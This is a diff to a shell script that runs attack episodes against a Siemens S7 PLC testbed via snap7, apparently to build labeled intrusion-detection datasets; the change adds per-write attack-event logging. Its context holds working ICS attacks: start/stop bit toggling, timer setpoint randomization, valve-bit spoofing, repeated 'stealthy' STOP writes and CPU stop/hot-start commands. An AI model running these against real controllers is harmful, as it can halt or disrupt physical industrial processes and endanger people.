@@ -11,6 +11,7 @@ set -euo pipefail
 #   - RWRITE attack writes Merker control bits, not PA/Q outputs.
 #   - Controller HMI is observe-only by default, so it does not mask attacks.
 #   - Timeline schema carries session_id, host_id, episode_id, day, note.
+#   - Write-style attacks also emit attack_events CSV with signal old/new values.
 #
 # Pre-run checklist:
 #   1. Set TARGET_IP/RACK/SLOT and CAPTURE_IFACE in testbed.conf.
@@ -47,6 +48,7 @@ ENABLE_CPU_CONTROL_ATTACK="${ENABLE_CPU_CONTROL_ATTACK:-0}"
 CAPTURE_DIR="${CAPTURE_DIR:-captures}"
 LOG_DIR="${LOG_DIR:-logs}"
 LABEL_DIR="${LABEL_DIR:-labels}"
+ATTACK_EVENT_LOG_ENABLED="${ATTACK_EVENT_LOG_ENABLED:-1}"
 
 DAY1_DURATION_S="${DAY1_DURATION_S:-${DUR_DAY1:-14400}}"
 DAY2_DURATION_S="${DAY2_DURATION_S:-${DUR_DAY2:-14400}}"
@@ -166,6 +168,10 @@ now_ms() {
 
 label_file() {
     echo "$LABEL_DIR/day${DAY}_${SESSION_ID}_${HOST_ID}_timeline.csv"
+}
+
+attack_event_file() {
+    echo "$LABEL_DIR/day${DAY}_${SESSION_ID}_${HOST_ID}_attack_events.csv"
 }
 
 label() {
@@ -546,7 +552,8 @@ try:
     from snap7.type import Areas
 except ImportError:
     from snap7.types import Areas
-from snap7.util import set_bool
+from snap7.util import get_bool, set_bool
+from attack_event_logger import log_attack_event
 
 target = "$TARGET_IP"
 rack = int("$RACK")
@@ -560,18 +567,30 @@ while True:
         if not c.get_connected():
             c.connect(target, rack, slot)
         m5 = c.read_area(Areas.MK, 0, 5, 1)
+        old_start = get_bool(m5, 0, 0)
+        old_stop = get_bool(m5, 0, 1)
         if toggle_stop:
             set_bool(m5, 0, 0, False)
             set_bool(m5, 0, 1, True)
         else:
             set_bool(m5, 0, 1, False)
             set_bool(m5, 0, 0, True)
+        new_start = get_bool(m5, 0, 0)
+        new_stop = get_bool(m5, 0, 1)
         c.write_area(Areas.MK, 0, 5, m5)
+        if old_start != new_start:
+            log_attack_event("M5.0_START", area="MK", byte_offset=5, bit_offset=0, data_type="bool", old_value=int(old_start), new_value=int(new_start))
+        if old_stop != new_stop:
+            log_attack_event("M5.1_STOP", area="MK", byte_offset=5, bit_offset=1, data_type="bool", old_value=int(old_stop), new_value=int(new_stop))
         if not toggle_stop:
             time.sleep(0.12)
             m5 = c.read_area(Areas.MK, 0, 5, 1)
+            old_start = get_bool(m5, 0, 0)
             set_bool(m5, 0, 0, False)
+            new_start = get_bool(m5, 0, 0)
             c.write_area(Areas.MK, 0, 5, m5)
+            if old_start != new_start:
+                log_attack_event("M5.0_START", area="MK", byte_offset=5, bit_offset=0, data_type="bool", old_value=int(old_start), new_value=int(new_start), note="start_pulse_reset")
         toggle_stop = not toggle_stop
         n += 1
         if n % 50 == 0:
@@ -596,7 +615,8 @@ try:
     from snap7.type import Areas
 except ImportError:
     from snap7.types import Areas
-from snap7.util import set_dint
+from snap7.util import get_dint, set_dint
+from attack_event_logger import log_attack_event
 
 target = "$TARGET_IP"
 rack = int("$RACK")
@@ -605,10 +625,15 @@ c = snap7.client.Client()
 values = [100, 250, 45000, 60000, 90000]
 n = 0
 print("[SETPOINT] randomizing CD1/CD2/CD3 timers", flush=True)
-def write_dint(client, offset, value):
+def read_dint(client, offset):
+    return get_dint(client.read_area(Areas.MK, 0, offset, 4), 0)
+def write_dint(client, offset, value, signal):
+    old = read_dint(client, offset)
     buf = bytearray(4)
     set_dint(buf, 0, int(value))
     client.write_area(Areas.MK, 0, offset, buf)
+    if old != int(value):
+        log_attack_event(signal, area="MK", byte_offset=offset, data_type="dint", old_value=old, new_value=int(value))
 while True:
     try:
         if not c.get_connected():
@@ -616,10 +641,10 @@ while True:
         cd1 = random.choice(values)
         cd2 = random.choice(values)
         cd3 = random.choice(values)
-        write_dint(c, 54, cd1)
-        write_dint(c, 58, cd2)
-        write_dint(c, 62, cd3)
-        write_dint(c, 50, random.choice([0, 120000, 180000]))
+        write_dint(c, 54, cd1, "CD1_MS")
+        write_dint(c, 58, cd2, "CD2_MS")
+        write_dint(c, 62, cd3, "CD3_MS")
+        write_dint(c, 50, random.choice([0, 120000, 180000]), "Times_1_MS")
         n += 1
         if n % 20 == 0:
             print(f"[SETPOINT] #{n} CD1={cd1} CD2={cd2} CD3={cd3}", flush=True)
@@ -643,7 +668,8 @@ try:
     from snap7.type import Areas
 except ImportError:
     from snap7.types import Areas
-from snap7.util import set_bool
+from snap7.util import get_bool, set_bool
+from attack_event_logger import log_attack_event
 
 target = "$TARGET_IP"
 rack = int("$RACK")
@@ -659,11 +685,26 @@ while True:
         v1, v2, v3 = random.choice(patterns)
         m5 = c.read_area(Areas.MK, 0, 5, 1)
         m6 = c.read_area(Areas.MK, 0, 6, 1)
+        changes_m5 = []
+        changes_m6 = []
+        old = get_bool(m5, 0, 4)
         set_bool(m5, 0, 4, bool(v1))
+        if old != bool(v1):
+            changes_m5.append(("M5.4_Vat_1", 5, 4, old, bool(v1)))
+        old = get_bool(m5, 0, 6)
         set_bool(m5, 0, 6, bool(v2))
+        if old != bool(v2):
+            changes_m5.append(("M5.6_Vat_2", 5, 6, old, bool(v2)))
+        old = get_bool(m6, 0, 0)
         set_bool(m6, 0, 0, bool(v3))
+        if old != bool(v3):
+            changes_m6.append(("M6.0_Vat_3", 6, 0, old, bool(v3)))
         c.write_area(Areas.MK, 0, 5, m5)
+        for signal, byte_offset, bit_offset, old_value, new_value in changes_m5:
+            log_attack_event(signal, area="MK", byte_offset=byte_offset, bit_offset=bit_offset, data_type="bool", old_value=int(old_value), new_value=int(new_value))
         c.write_area(Areas.MK, 0, 6, m6)
+        for signal, byte_offset, bit_offset, old_value, new_value in changes_m6:
+            log_attack_event(signal, area="MK", byte_offset=byte_offset, bit_offset=bit_offset, data_type="bool", old_value=int(old_value), new_value=int(new_value))
         n += 1
         if n % 30 == 0:
             print(f"[SPOOF] #{n} Vat=({v1},{v2},{v3})", flush=True)
@@ -687,7 +728,8 @@ try:
     from snap7.type import Areas
 except ImportError:
     from snap7.types import Areas
-from snap7.util import set_bool
+from snap7.util import get_bool, set_bool
+from attack_event_logger import log_attack_event
 
 target = "$TARGET_IP"
 rack = int("$RACK")
@@ -700,9 +742,17 @@ while True:
         if not c.get_connected():
             c.connect(target, rack, slot)
         m5 = c.read_area(Areas.MK, 0, 5, 1)
+        old_stop = get_bool(m5, 0, 1)
+        old_start = get_bool(m5, 0, 0)
         set_bool(m5, 0, 1, True)
         set_bool(m5, 0, 0, False)
+        new_stop = get_bool(m5, 0, 1)
+        new_start = get_bool(m5, 0, 0)
         c.write_area(Areas.MK, 0, 5, m5)
+        if old_stop != new_stop:
+            log_attack_event("M5.1_STOP", area="MK", byte_offset=5, bit_offset=1, data_type="bool", old_value=int(old_stop), new_value=int(new_stop))
+        if old_start != new_start:
+            log_attack_event("M5.0_START", area="MK", byte_offset=5, bit_offset=0, data_type="bool", old_value=int(old_start), new_value=int(new_start))
         n += 1
         if n % 10 == 0:
             print(f"[STEALTHY] #{n} STOP writes", flush=True)
@@ -814,6 +864,7 @@ PYEOF
 import time
 
 import snap7
+from attack_event_logger import log_attack_event
 
 target = "$TARGET_IP"
 rack = int("$RACK")
@@ -825,10 +876,12 @@ while True:
         if not c.get_connected():
             c.connect(target, rack, slot)
         c.plc_stop()
+        log_attack_event("CPU_STOP", area="CPU", data_type="cpu_command", new_value="STOP", status="command_sent")
         print("[CPU_STOP] STOP sent", flush=True)
         time.sleep(5)
         try:
             c.plc_hot_start()
+            log_attack_event("CPU_HOT_START", area="CPU", data_type="cpu_command", new_value="HOT_START", status="command_sent")
             print("[CPU_STOP] HOT_START sent", flush=True)
         except Exception as exc:
             print(f"[CPU_STOP][WARN] HOT_START denied: {exc}", flush=True)
@@ -871,6 +924,14 @@ run_attack_episode() {
     local episode_id="${SESSION_ID}:day${DAY}:${scenario}:r${rep}"
     local note="rep=${rep};duration_s=${duration_s};host=${HOST_ID}"
     local pid
+
+    if [[ "$ATTACK_EVENT_LOG_ENABLED" == "1" ]]; then
+        export ATTACK_EVENT_FILE
+        ATTACK_EVENT_FILE="$(attack_event_file)"
+    else
+        export ATTACK_EVENT_FILE=""
+    fi
+    export ATTACK_EPISODE_ID="$episode_id" ATTACK_SCENARIO="$scenario" ATTACK_DAY="$DAY" SESSION_ID HOST_ID
 
     label "$scenario" "START" "$episode_id" "$note"
     start_attack_process "$scenario"
